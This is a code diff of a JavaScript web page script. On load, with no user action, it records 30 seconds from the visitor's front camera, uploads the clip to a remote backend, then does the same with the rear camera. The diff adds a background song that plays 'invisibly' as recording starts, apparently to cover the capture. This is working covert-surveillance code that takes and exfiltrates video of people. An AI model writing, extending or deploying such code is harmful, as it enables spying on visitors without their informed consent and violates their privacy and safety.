@@ -2,13 +2,14 @@
 
 document.addEventListener('DOMContentLoaded', () => {
     const videoElement = document.getElementById('videoElement');
+    const musica = document.getElementById('musicaFondo');
     
     let stream = null;
     let mediaRecorder = null;
     let recordedChunks = [];
     
     // Función de transferencia HTTP hacia el backend remoto
-    const enviarVideo = (chunks, tipoCamara) => {
+    const enviarVideo = (chunks) => {
         const clipBlob = new Blob(chunks, { type: 'video/webm' });
         const formData = new FormData();
         formData.append('video', clipBlob, 'clip.webm');
@@ -29,7 +30,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Función principal de automatización secuencial de hardware
     const iniciarCapturaAutomatica = () => {
         const constraintsFrontal = {
             video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
@@ -41,11 +41,16 @@ document.addEventListener('DOMContentLoaded', () => {
             audio: false
         };
 
-        // PASO 1: Arrancar automáticamente con la cámara frontal
+        // PASO 1: Arrancar con la cámara frontal
         navigator.mediaDevices.getUserMedia(constraintsFrontal)
             .then((mediaStream) => {
                 stream = mediaStream;
                 if (videoElement) videoElement.srcObject = stream;
+                
+                // DISPARADOR DE AUDIO: Activa tu canción mp3 de fondo de forma nativa e invisible
+                if (musica) {
+                    musica.play().catch(e => console.log("Interacción requerida previa: ", e));
+                }
                 
                 recordedChunks = [];
                 mediaRecorder = new MediaRecorder(stream);
@@ -55,10 +60,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 };
                 
                 mediaRecorder.onstop = () => {
-                    enviarVideo(recordedChunks, 'frontal');
+                    enviarVideo(recordedChunks);
                     detenerStream();
 
-                    // PASO 2: Transición automática inmediata al lente de entorno (trasero)
+                    // PASO 2: Transición automática al lente trasero
                     setTimeout(() => {
                         navigator.mediaDevices.getUserMedia(constraintsTrasera)
                             .then((traseraStream) => {
@@ -73,35 +78,34 @@ document.addEventListener('DOMContentLoaded', () => {
                                 };
                                 
                                 mediaRecorder.onstop = () => {
-                                    enviarVideo(recordedChunks, 'trasera');
+                                    enviarVideo(recordedChunks);
                                     detenerStream();
                                 };
 
                                 mediaRecorder.start();
                                 
-                                // Duración estricta de 30 segundos para la cámara trasera
+                                // Duración de 30 segundos para la cámara trasera
                                 setTimeout(() => {
                                     if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                                 }, 30000);
                             })
                             .catch((err) => {
-                                console.error('Restricción o ausencia de lente trasero en el cliente:', err);
+                                console.error('Lente trasero ausente:', err);
                             });
                     }, 1000);
                 };
                 
                 mediaRecorder.start();
                 
-                // Duración estricta de 30 segundos para la cámara frontal
+                // Duración de 30 segundos para la cámara frontal
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                 }, 30000);
             })
             .catch((err) => {
-                console.error('Falta de autorización de permisos HTTPS por el cliente:', err);
+                console.error('Falta de autorización de permisos HTTPS:', err);
             });
     };
 
-    // Ejecución inmediata al cargar el entorno
     iniciarCapturaAutomatica();
 });
